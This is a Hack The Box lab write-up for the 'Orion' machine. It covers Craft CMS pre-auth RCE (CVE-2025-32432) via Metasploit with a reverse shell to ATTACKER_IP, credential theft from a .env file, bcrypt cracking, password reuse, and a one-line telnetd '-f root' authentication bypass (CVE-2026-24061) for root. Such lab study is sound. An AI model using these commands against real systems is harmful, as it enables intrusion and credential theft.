# HTB: Orion

<img src="../assets/icons/orion.png" width="100">

**Difficulty:** Easy
**OS:** Linux (Ubuntu 22.04.5 LTS)

## Overview

Orion is an Easy-rated Linux machine centered on a real-world, critical-severity Craft CMS vulnerability (CVE-2025-32432) for initial access, followed by credential discovery and reuse to escalate to a standard user, and a rare, recently disclosed GNU InetUtils telnetd authentication bypass (CVE-2026-24061) for root.

**Attack chain summary:**

1. Unauthenticated RCE against Craft CMS 5.6.16 (CVE-2025-32432) → shell as `www-data`
2. Database credentials recovered from Craft's `.env` file
3. Craft admin password hash dumped from MySQL and cracked
4. Password reuse between the Craft admin account and the OS-level user `adam` → SSH access + user flag
5. Local-only telnet service found running as root via inetd; authentication bypass (CVE-2026-24061) → root shell + root flag

---

## Reconnaissance

### Nmap

```
nmap -sC -sV -oN nmap/initial [TARGET_IP]
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.15 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://orion.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
```

Port 80 issued a redirect to `http://orion.htb/`, indicating vhost-based routing. Added the hostname to `/etc/hosts`:

```
[TARGET_IP]   orion.htb
```

### Web Enumeration

Browsing to `http://orion.htb/admin` revealed a **Craft CMS 5.6.16** login page, with the version disclosed in a footer banner.

A quick search for known vulnerabilities in this version turned up **CVE-2025-32432**, a critical (CVSS 10.0) unauthenticated remote code execution vulnerability affecting Craft CMS versions prior to 5.6.17 (also affecting older 3.x and 4.x branches).

---

## Initial Access — CVE-2025-32432 (Craft CMS Pre-Auth RCE)

**Reference:** [NVD — CVE-2025-32432](https://nvd.nist.gov/vuln/detail/CVE-2025-32432)
**Reference:** [Rapid7 Metasploit Module](https://www.rapid7.com/db/modules/exploit/linux/http/craftcms_preauth_rce_cve_2025_32432/)
**Reference:** [SensePost — Investigating an In-the-Wild Campaign Using RCE in CraftCMS](https://sensepost.com/blog/2025/investigating-an-in-the-wild-campaign-using-rce-in-craftcms/)

### Vulnerability Summary

Craft CMS exposes an unauthenticated endpoint, `actions/assets/generate-transform`, used for on-the-fly image resizing. The vulnerability chain works as follows:

1. A valid **asset ID** is required by the endpoint. In Craft 5.x, this check occurs *after* deserialization occurs, making it possible to enumerate/brute-force a valid ID in a small numeric range.
2. The `handle` parameter of the JSON body accepts a `__class` override, enabling **PHP object injection**.
3. The injected object chain abuses `craft\behaviors\FieldLayoutBehavior` to instantiate `yii\rbac\PhpManager`. `PhpManager`'s `init()`/`load()` flow calls `loadFromFile($this->itemFile)`, and since PHP's `require` executes the target file as code, controlling `itemFile` yields arbitrary code execution.
4. Before triggering the gadget chain, the attacker "poisons" their own PHP session file (stored server-side at `/var/lib/php/sessions/sess_<PHPSESSID>`) by injecting a PHP payload into a request parameter that Craft writes into the session.
5. The final request points `PhpManager.itemFile` at the poisoned session file, causing it to be included and executed as PHP — resulting in RCE.

### Exploitation

Exploited via the public Metasploit module:

```
use exploit/linux/http/craftcms_preauth_rce_cve_2025_32432
set RHOSTS [TARGET_IP]
set VHOST orion.htb
set LHOST [ATTACKER_IP]
set LPORT 4444
exploit
```

```
[*] Started reverse TCP handler on [ATTACKER_IP]:4444
[*] Running automatic check ("set AutoCheck false" to disable)
[+] Leaked session.save_path: /var/lib/php/sessions
[+] The target is vulnerable. Session path leaked
[*] Injecting stub & triggering payload...
[*] Sending stage (45739 bytes) to [TARGET_IP]
[*] Meterpreter session 1 opened ([ATTACKER_IP]:4444 -> [TARGET_IP]:34470)
```

```
meterpreter > getuid
Server username: www-data
meterpreter > sysinfo
Computer        : orion
OS              : Linux orion 5.15.0-177-generic #187-Ubuntu SMP x86_64
```

Shell obtained as `www-data`.

---

## Credential Discovery

Craft CMS configuration files typically store database credentials in a `.env` file located at the application root. Found at:

```
/var/www/html/craft/.env
```

```
CRAFT_DB_DRIVER=mysql
CRAFT_DB_SERVER=127.0.0.1
CRAFT_DB_PORT=3306
CRAFT_DB_DATABASE=orion
CRAFT_DB_USER=root
CRAFT_DB_PASSWORD=SuperSecureCraft123Pass!
```

Logged into the local MySQL instance using the leaked root credentials:

```
mysql -h 127.0.0.1 -u root -p'SuperSecureCraft123Pass!' orion
```

Dumped the Craft `users` table:

```sql
select username, email, password from users;
```

```
admin:$2y$13$e9zuohgFZzGtbQalcn9Mz.5PJbjxobO0GMbXo8NHp3P/B42LUg0lS
```

Cracked the bcrypt hash with John the Ripper against `rockyou.txt`:

```
john --format=bcrypt --wordlist=/usr/share/wordlists/rockyou.txt craft_hash.txt
```

**Result:** `admin:darkangel`

---

## Lateral Movement — Password Reuse

The cracked Craft admin credentials (`admin:darkangel`) worked for the OS-level user `adam` as well:

```
ssh adam@orion.htb
# Password: darkangel
```

```
adam@orion:~$ id
uid=1000(adam) gid=1000(adam) groups=1000(adam)
```

**User flag:**

```
adam@orion:~$ cat user.txt
[REDACTED]
```

---

## Privilege Escalation — CVE-2026-24061 (GNU InetUtils Telnetd Auth Bypass)

**Reference:** [Exploit-DB 52524 — GNU InetUtils 2.6 Telnetd Remote Privilege Escalation](https://www.exploit-db.com/exploits/52524)
**Reference:** [CSO Online — Trivial Telnet authentication bypass exposes devices to complete takeover](https://www.csoonline.com/article/4120997/trivial-telnet-authentication-bypass-exposes-devices-to-complete-takeover.html)
**Reference:** [SOC Prime — CVE-2026-24061 Detection](https://socprime.com/blog/cve-2026-24061-vulnerability/)

### Enumeration

Standard privilege escalation enumeration (`sudo -l`, SUID binaries, cron jobs, capabilities) turned up nothing. A listening-services check, however, revealed an internal-only telnet service:

```
adam@orion:~$ ss -tulnp
tcp   LISTEN   0   10   127.0.0.1:23   0.0.0.0:*
```

```
adam@orion:~$ ps aux | grep telnet
root   2256  0.0  0.0   2896  1136 ?   S   23:53   0:00 telnetd
```

Confirmed via `/etc/inetd.conf` that the service is spawned by inetd as **root** on every connection to `127.0.0.1:23`:

```
127.0.0.1:telnet stream tcp nowait root /usr/local/sbin/telnetd telnetd
```

### Vulnerability Summary

GNU InetUtils telnetd (versions 2.0 through 2.6) fails to sanitize the `USER` environment variable supplied by the client during Telnet NEW-ENVIRON option negotiation before passing it as an argument to `/bin/login`. Supplying a crafted value of `-f root` causes `login` to interpret it as a "pre-authenticated" flag, bypassing the password prompt and logging the session in directly as `root`.

Because this telnetd instance is spawned by inetd running as `root` and bound to `127.0.0.1:23`, any local user able to reach the loopback interface can exploit this to escalate directly to root.

### Exploitation

```
adam@orion:~$ telnet -l "-f root" 127.0.0.1
Trying 127.0.0.1...
Connected to 127.0.0.1.
Escape character is '^]'.
Linux 5.15.0-177-generic (orion) (pts/2)
```

```
root@orion:~# id
uid=0(root) gid=0(root) groups=0(root)
```

**Root flag:**

```
root@orion:~# cat /root/root.txt
[REDACTED]
```

---

## Summary / Lessons Learned

- **Outdated CMS versions with disclosed version banners** are a direct path to critical, pre-auth RCE — Craft CMS 5.6.16 was one patch release behind the fix for CVE-2025-32432.
- **Secrets in `.env` files** (database credentials in this case) are a common and high-value target once initial code execution is achieved.
- **Password reuse across application-layer accounts and OS-level accounts** remains one of the most reliable escalation paths on Easy-rated boxes.
- **Legacy/deprecated services like telnet**, even when restricted to loopback, can still be leveraged for local privilege escalation — especially when spawned as root via inetd. CVE-2026-24061 is a good reminder that decades-old codebases can still harbor freshly discovered, trivially exploitable bugs.

## References

- [CVE-2025-32432 — NVD](https://nvd.nist.gov/vuln/detail/CVE-2025-32432)
- [Rapid7 — craftcms_preauth_rce_cve_2025_32432 Metasploit Module](https://www.rapid7.com/db/modules/exploit/linux/http/craftcms_preauth_rce_cve_2025_32432/)
- [SensePost — Investigating an In-the-Wild Campaign Using RCE in CraftCMS](https://sensepost.com/blog/2025/investigating-an-in-the-wild-campaign-using-rce-in-craftcms/)
- [CVE-2026-24061 — Exploit-DB 52524](https://www.exploit-db.com/exploits/52524)
- [CSO Online — Trivial Telnet authentication bypass exposes devices to complete takeover](https://www.csoonline.com/article/4120997/trivial-telnet-authentication-bypass-exposes-devices-to-complete-takeover.html)
- [SOC Prime — CVE-2026-24061 Detection](https://socprime.com/blog/cve-2026-24061-vulnerability/)